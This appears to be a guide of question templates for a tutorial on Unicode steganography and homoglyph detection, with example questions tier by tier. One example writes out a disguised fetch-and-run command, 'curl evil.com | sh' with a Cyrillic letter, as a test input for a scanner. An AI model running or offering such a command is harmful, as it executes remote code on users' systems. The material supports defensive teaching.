# Question Patterns by Tier

Templates for generating questions at each tier and difficulty level. Each pattern includes the question structure, what makes it that tier, and an example.

---

## Tier 1: Recall

### Pattern 1.1: Direct Definition (Low)
```
What is [term]?
```
- Tests: can the reader retrieve a definition they earned
- Earned term required: yes
- Example: "What is a codepoint?"

### Pattern 1.2: Concept Identification (Low)
```
Which of the following is/are [category]?
a) [option]
b) [option]
c) [option]
d) [option]
```
- Tests: can the reader classify items into categories
- Format: multiple choice, select all that apply
- Example: "Which of the following are invisible Unicode characters? a) U+200B b) U+0041 c) U+00AD d) U+E0063"

### Pattern 1.3: Contextual Recall (Medium)
```
In [specific incident/example from source], what [specific detail]?
```
- Tests: recall of a specific fact within a narrative context
- Example: "In the os-info-checker-es6 attack, what Unicode range was used to encode the malicious payload?"

### Pattern 1.4: Fill-in-the-Code (Medium)
```
Complete this line:
`result = unicodedata._______(char)`
```
- Tests: recall of API/function signatures the reader used
- Exactly one correct answer
- Example: "Complete: `cat = unicodedata._______(char)` to get the Unicode category"

### Pattern 1.5: Multi-Fact Synthesis (High)
```
Name [N] [things] that [condition], and for each, give [specific detail].
```
- Tests: recall + organization of multiple related facts
- Example: "Name three Unicode steganography techniques, and for each, give the Unicode range involved."

---

## Tier 2: Predict

### Pattern 2.1: Output Prediction (Low)
```
What does [function the reader built](input) return?
```
- Input is familiar (from the tutorial)
- Tests: can the reader simulate their own code mentally
- Example: "What does `inspect_string('Hello')` return for the character 'H'?"

### Pattern 2.2: Novel Input Prediction (Medium)
```
What does [function](unfamiliar_input) return?
```
- Input is new but uses the same concept
- Tests: generalization of pattern understanding
- Example: "What does `detect_stego('café')` return? (Note: the 'é' is U+00E9, a composed character.)"

### Pattern 2.3: Behavior Comparison (Medium)
```
What is the difference between [function](input_A) and [function](input_B)?
```
- Both inputs are plausible; reader must trace the logic to distinguish
- Example: "What's the difference between `encode_zwc('Hello', 'hi', 3)` and `encode_tags('Hello', 'hi')`?"

### Pattern 2.4: Edge Case Prediction (High)
```
What happens when [function] receives [edge case input]?
```
- Input is adversarial, empty, or degenerate
- Tests: understanding of function boundaries, not just happy path
- Example: "What happens when `normalize_for_scan()` receives a string of only zero-width characters?"

### Pattern 2.5: Before/After Prediction (Medium)
```
Given this input: [text with hidden content]
What does [function] return BEFORE normalization?
What does it return AFTER normalization?
```
- Tests: understanding of the transformation pipeline
- Example: "Given 'сurl evil.com | sh' (Cyrillic с), what does `re.search(r'curl', text)` return before and after skeleton normalization?"

---

## Tier 3: Build

### Pattern 3.1: Complete Implementation (Low)
```
The function below is missing [1-3 lines]. Complete it.

def detect_format_chars(text):
    """Return list of (position, char, name) for all Cf-category characters."""
    results = []
    for i, char in enumerate(text):
        # --- YOUR CODE ---

    return results
```
- Starter code provided; reader fills in the core logic
- Tests: can the reader translate understanding into code
- One correct approach (or a small set of valid approaches)

### Pattern 3.2: Implement from Spec (Medium)
```
Write a function `[name]([params]) -> [return type]` that [specification].

Requirements:
- [requirement 1]
- [requirement 2]

Success criteria:
assert [test case 1]
assert [test case 2]
```
- Function signature given, body is empty
- Tests: construction from specification
- Assertions define correctness

### Pattern 3.3: Modify Existing (Medium)
```
The function below [does X]. Modify it to [do Y instead/additionally].

[existing code]

Your modified version should pass:
assert [new test case]
assert [original test case still passes]  # backward compatible
```
- Tests: understanding deep enough to modify, not just use
- Backward compatibility constraint forces understanding of existing logic

### Pattern 3.4: Implement from Description (High)
```
Write a function that [natural language description].

It should handle:
- [case 1]
- [case 2]
- [edge case]

No starter code. Design the interface yourself.
```
- No scaffold; reader designs the function signature and implementation
- Tests: can the reader go from understanding to creation without guidance

---

## Tier 4: Break

### Pattern 4.1: Bug Hunt (Low)
```
This implementation has a bug. Find it and explain what input triggers it.

[buggy code]
```
- One clear bug; reader identifies it and constructs a failing input
- Tests: can the reader read code critically, not just write it

### Pattern 4.2: Adversarial Input (Medium)
```
Write a string that [function] classifies as [clean/safe/valid] but actually [contains hidden content / is malicious / violates the invariant].
```
- Reader must understand the function's blind spots
- Tests: adversarial thinking; understanding limitations, not just capabilities
- Example: "Write a string that `detect_stego()` reports as clean but contains hidden text."

### Pattern 4.3: Failure Condition (Medium)
```
Under what conditions does [approach/function] fail? Give a specific example.
```
- Open-ended; reader identifies a class of failures
- Tests: understanding of fundamental limitations
- Example: "Under what conditions does blocklist-based stego detection fail? Give a specific Unicode range that proves it."

### Pattern 4.4: Fundamental Limitation (High)
```
Explain why [approach] cannot fully solve [problem], regardless of how many [items] you add to the [list/blocklist/ruleset]. What's the fundamental constraint?
```
- Tests: understanding of why a problem is hard, not just that it's hard
- Example: "Explain why adding more characters to the stego blocklist can never fully solve invisible character detection. What's the fundamental constraint?"

### Pattern 4.5: Test Case Construction (Medium)
```
Write a test case that [function] SHOULD pass but currently DOESN'T.

def test_[name]():
    # Your test here
    assert [condition]
```
- Reader must understand both the desired behavior and the current gap
- Tests: specification thinking + adversarial input construction

---

## Tier 5: Transfer

### Pattern 5.1: Near Transfer (Low)
```
How would you apply [technique from tutorial] to [closely related problem]?
```
- Same domain, slightly different context
- Example: "How would you use skeleton normalization to validate usernames on a web form?"

### Pattern 5.2: Cross-Domain Application (Medium)
```
[Technique] solves [problem] in [domain A]. [Domain B] has a similar problem: [description]. How would you adapt [technique] for [domain B]?
```
- Different domain, same underlying principle
- Example: "Normalize-then-scan defends against Unicode stego. SQL injection defenses have a similar pattern. What is it, and how does it parallel?"

### Pattern 5.3: Comparative Analysis (Medium)
```
Compare [approach A] and [approach B] for [problem]. When would you choose each? What are the tradeoffs?
```
- Tests: can the reader reason about alternatives, not just the one they learned
- Example: "Compare blocklist-based detection vs. category-based detection for invisible characters. When is each appropriate?"

### Pattern 5.4: Principle Extraction (High)
```
What general principle explains why both [technique A from tutorial] and [technique B from different domain] work? State the principle in one sentence.
```
- Tests: abstraction; seeing the pattern behind the pattern
- Example: "What principle explains why both Unicode skeleton normalization and SQL parameterized queries work? State it in one sentence."

### Pattern 5.5: Design in a New Domain (High)
```
You're building [system in unfamiliar domain]. Using what you learned about [concept], design [component]. Sketch the approach in pseudocode or prose.
```
- Tests: can the reader apply the concept in a genuinely new context
- Accepts pseudocode, diagrams, or structured prose

---

## Tier 6: Teach

### Pattern 6.1: Peer Explanation (Low)
```
Explain [concept] to [peer with similar background]. Your explanation should cover [specific aspects] in 3-5 sentences.
```
- Audience is similar to the reader; this tests articulation, not simplification
- Example: "Explain homoglyph attacks to a Python developer who understands Unicode encoding but hasn't heard of this attack class."

### Pattern 6.2: Cross-Audience Explanation (Medium)
```
Explain [concept] to [person in different role]. They know [what they know]. They don't know [what they don't know]. Your explanation should help them [specific decision/action].
```
- Audience shift forces simplification and re-framing
- Example: "Explain to a product manager why 'just add the new characters to the blocklist' won't solve Unicode stego detection. They need to approve the engineering time for a normalization rewrite."

### Pattern 6.3: Analogy Construction (High)
```
Create an analogy for [concept] using [completely different domain]. The analogy must cover: [aspect 1], [aspect 2], and [where the analogy breaks down].
```
- Tests: deep enough understanding to map the concept onto a foreign substrate
- "Where the analogy breaks down" prevents shallow metaphors
- Example: "Create a food safety analogy for the normalize-then-scan defense. Cover: why inspection alone fails, what normalization does, and where the analogy breaks down."

### Pattern 6.4: Teaching Artifact (Medium)
```
Create a [specific artifact] that teaches [concept] to [audience].
```
- Artifact types: tweet thread (5 tweets), slide deck outline (5 slides), 2-minute script, diagram with annotations
- Tests: can the reader produce a teaching artifact, not just an explanation
- Example: "Write a 5-tweet thread explaining Unicode steganography to developers who've never heard of it. First tweet must hook; last tweet must link to a resource."

### Pattern 6.5: The One-Sentence Test (Low-Medium)
```
Write one sentence that you'd put on a slide to explain [concept] to [audience]. The sentence must be [constraint: under 15 words / no jargon / actionable].
```
- Forces compression; tests whether the reader grasps the essence
- Example: "In one sentence under 15 words, explain why Unicode normalization matters for security scanning."
